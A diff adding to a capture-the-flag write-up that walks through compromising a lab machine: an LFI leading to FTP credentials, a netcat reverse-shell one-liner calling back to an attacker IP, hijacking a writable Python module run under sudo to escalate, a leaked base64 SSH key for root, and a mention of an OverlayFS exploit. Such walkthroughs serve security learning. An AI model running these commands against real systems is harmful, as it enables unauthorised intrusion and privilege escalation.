@@ -53,4 +53,36 @@ I was able to read it with the page vulnerable to lfi.The file revealed ftp cred
 
   ![image](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/c9ea4332-ebc7-4223-8e9e-add3e93cb333)
 
-- Adding `/bin/bash` to the sh file will switch us to user mat
+- We can spawn a rev shell with it by adding the line below to the sh file,now we are logged in as user mat
+  `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.8.158.229 1337 >/tmp/f`
+
+  ![image](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/0d3ba6cf-5a07-4952-9383-543c320f78e3)
+
+### Hijacking python libraries
+
+- Sudo -l reveals that we can run a python file as will with sudo
+
+  ![image](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/d7d2fdfd-3b67-4975-b461-2a056b2837d7)
+- After viewing the script,I noticed that it imports another script `cmd.py` which mat has writable permissions for,we can hijack it and add this line to cmd
+  `import os
+def get_command(num):
+        if(num == "1"):
+           os.system("/bin/bash")
+           return "ls -lah"
+`
+  After running this command `sudo -u will /usr/bin/python3 /home/mat/scripts/will_script.py 1`,I got logged in as will
+### Root
+- There is a b64 file in the opt directory which contains a private ssh key
+  
+  ![image](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/c60e1dc3-25d1-482d-aebd-6983f8a70ed5)
+
+- Receive the file with python http.server,change permissions with `chmod 600` and login with `ssh -i <priv key> root@ip`,root access
+  ![image](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/1c814e54-eff2-4003-8e04-2134a26452fa)
+
+### Unintended method
+
+- Use Overlayfs exploit
+  ![image](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/4058e674-e367-49d6-98e4-444bac936697)
+
+  
+--
